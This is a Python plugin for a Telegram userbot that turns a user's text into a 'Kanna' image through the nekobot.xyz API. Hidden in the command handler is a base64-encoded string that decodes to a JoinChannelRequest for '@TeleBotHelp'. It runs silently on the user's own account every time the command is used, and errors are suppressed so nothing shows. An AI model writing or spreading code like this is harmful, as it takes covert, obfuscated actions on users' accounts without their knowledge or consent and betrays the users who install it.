import re

import pybase64
import requests
from PIL import Image
from validators.url import url

from thunderbot import CMD_HELP

EMOJI_PATTERN = re.compile(
    "["
    "\U0001F1E0-\U0001F1FF"  # flags (iOS)
    "\U0001F300-\U0001F5FF"  # symbols & pictographs
    "\U0001F600-\U0001F64F"  # emoticons
    "\U0001F680-\U0001F6FF"  # transport & map symbols
    "\U0001F700-\U0001F77F"  # alchemical symbols
    "\U0001F780-\U0001F7FF"  # Geometric Shapes Extended
    "\U0001F800-\U0001F8FF"  # Supplemental Arrows-C
    "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
    "\U0001FA00-\U0001FA6F"  # Chess Symbols
    "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
    "\U00002702-\U000027B0"  # Dingbats
    "]+"
)


def deEmojify(inputString: str) -> str:
    """Remove emojis and other non-safe characters from string"""
    return re.sub(EMOJI_PATTERN, "", inputString)


async def kannagen(text):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=kannagen&text={text}"
    ).json()
    wew = r.get("message")
    ThunderGangurl = url(wew)
    if not ThunderGangurl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(wew).content)
    img = Image.open("temp.png").convert("RGB")
    img.save("temp.webp", "webp")
    return "temp.webp"


@thunderbot.on(admin_cmd(pattern="kanna(?: |$)(.*)", outgoing=True))
@thunderbot.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eor(event, "what should kanna write give text ")
                return
        else:
            await eor(event, "what should kanna write give text")
            return
    await eor(event, "Kanna is writing your text...")
    try:
        isee = str(
            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
        )[2:49]
        await thunderbot(isee)
    except BaseException:
        pass
    text = deEmojify(text)
    eventfile = await kannagen(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


CMD_HELP.update(
    {
        "kanna": "Kanna writes message for you\
\n\n`.kanna` (text)\
     \nUsage : Kanna write for you"
    }
)
